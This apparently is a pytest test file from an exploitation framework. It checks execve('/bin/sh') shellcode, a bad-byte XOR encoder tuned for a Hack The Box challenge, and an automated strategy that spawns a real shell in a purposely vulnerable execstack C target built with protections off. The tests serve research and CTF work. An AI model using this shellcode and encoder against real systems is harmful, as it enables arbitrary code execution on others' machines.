"""Weaponization: execve("/bin/sh") shellcode injection into a target that reads input into an
executable region and jumps to it (execstack / RWX), plus a bad-char XOR encoder for filtered
input. The `shellcode` L3 strategy delivers it and confirms a real spawned shell -- this also
solves the HTB `execute` challenge (a bad-char-filtered jump-to-buffer)."""
from __future__ import annotations

import subprocess
import time

import pytest
from lykos.analyze import register
from lykos.analyze.dynamic import sandbox
from lykos.analyze.ingest import ingest, enqueue_triage
from lykos.analyze.poc import enqueue_exploit, shellcode
from lykos.db.dao import FindingDAO, PocDAO
from lykos.jobs import JobConfig, JobQueue, WorkerPool


def test_execve_binsh_shape():
    sc = shellcode.execve_binsh()
    assert len(sc) == 25 and sc.endswith(b"\x0f\x05") and b"/bin/sh" in sc


def test_encode_avoiding_removes_bad_bytes():
    bad = bytes({0x3B, 0x54, 0x62, 0x69, 0x6E, 0x73, 0x68, 0xF6, 0xD2, 0xC0, 0x5F, 0xC9,
                 0x66, 0x6C, 0x61, 0x67})               # HTB execute's banned set
    enc = shellcode.encode_avoiding(shellcode.execve_binsh(), bad)
    assert enc is not None
    assert not (set(enc) & set(bad)), "encoded shellcode still contains banned bytes"


def test_encode_avoiding_returns_none_when_impossible():
    # ban a FIXED decoder-stub byte (0x48 REX.W) -> no key can help
    assert shellcode.encode_avoiding(shellcode.execve_binsh(), b"\x48") is None


@pytest.fixture
def x86_64_only():
    if sandbox.host_arch() != "x86-64":
        pytest.skip("shellcode injection is x86-64 native only")


@pytest.fixture
def jmpbuf(gcc, tmp_path_factory, x86_64_only):
    d = tmp_path_factory.mktemp("sc")
    (d / "j.c").write_text("#include <unistd.h>\n"
                           "int main(void){ char buf[256]; read(0,buf,sizeof buf);"
                           " ((void(*)(void))buf)(); return 0; }\n")
    out = d / "jmpbuf"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-z", "execstack",
                       str(d / "j.c"), "-o", str(out)], capture_output=True).returncode != 0:
        pytest.skip("cannot build execstack jump-to-buffer target")
    return out


def test_execve_binsh_spawns_shell(jmpbuf):
    p = subprocess.Popen([str(jmpbuf)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    p.stdin.write(shellcode.execve_binsh() + b"\n"); p.stdin.flush(); time.sleep(0.2)
    p.stdin.write(b"echo SC-OK; id\n"); p.stdin.flush()
    try:
        out, _ = p.communicate(timeout=6)
    except Exception:                                    # noqa: BLE001
        p.kill(); out, _ = p.communicate()
    assert b"SC-OK" in out and b"uid=" in out


def test_encoded_shellcode_decodes_and_spawns_shell(jmpbuf):
    bad = bytes({0x3B, 0xC0, 0x2F, 0x62, 0x69, 0x6E, 0x73, 0x68})
    enc = shellcode.encode_avoiding(shellcode.execve_binsh(), bad)
    assert enc and not (set(enc) & set(bad))
    p = subprocess.Popen([str(jmpbuf)], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT)
    p.stdin.write(enc + b"\n"); p.stdin.flush(); time.sleep(0.2)
    p.stdin.write(b"echo ENC-OK; id\n"); p.stdin.flush()
    try:
        out, _ = p.communicate(timeout=6)
    except Exception:                                    # noqa: BLE001
        p.kill(); out, _ = p.communicate()
    assert b"ENC-OK" in out                              # decoded in place, then execve


@pytest.fixture
def pool(store):
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


def test_shellcode_strategy_confirms_l3(store, case, pool, jmpbuf):
    t = ingest(store, case.id, jmpbuf, filename="jmpbuf")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True); assert pool.wait_idle(40)
    run = enqueue_exploit(q, t, params={"input_mode": "stdin", "strategy": "shellcode"})
    assert pool.wait_idle(90) and q.runs.get(run.id).status == "done"
    assert any(pc.level == "L3" and pc.verified for pc in PocDAO(store.conn).list_by_target(t.id))
    pb = [f for f in FindingDAO(store.conn).list_by_target(t.id) if f.state == "poc-backed"]
    assert any("shellcode" in e.get("detail", "") for f in pb for e in f.evidence)
